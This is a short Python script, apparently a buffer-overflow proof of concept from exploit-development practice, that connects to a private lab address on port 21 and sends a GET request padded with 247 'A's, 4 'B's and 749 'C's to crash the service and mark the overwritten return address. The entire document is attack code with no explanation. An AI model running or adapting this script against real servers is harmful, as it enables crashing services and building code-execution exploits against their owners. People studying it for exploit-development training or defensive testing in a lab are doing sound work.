import socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('192.168.1.116',21))
pre_buff="GET "
buff = "A"*247 +"B"*4 + "C"*749
end_buff=" HTTP/1.1\r\n\r\n"
final_buff = pre_buff+buff+end_buff
sock.send(final_buff)
sock.recv(1024)
sock.close()